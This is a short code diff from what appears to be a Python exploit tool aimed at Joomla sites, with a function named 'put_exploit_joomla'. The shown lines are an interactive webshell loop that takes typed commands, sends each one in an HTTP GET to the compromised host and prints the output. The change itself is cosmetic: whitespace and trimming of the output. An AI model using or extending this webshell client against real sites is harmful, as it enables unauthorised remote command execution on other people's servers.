@@ -94,14 +94,14 @@ def put_exploit_joomla(url):
         print("Enter a (web)shell command (type 'exit' to quit): ")
         while True:
             user_cmd = input()
-        
+
             if user_cmd.lower() == 'exit':
                 break
 
             new_url = f"{host}{user_cmd}"
             response = requests.get(new_url)
         
-            print(response.content.decode('utf-8'))
+            print(response.content.decode('utf-8').rstrip())
     else:
         print("[!] Can't open a webshell")
 
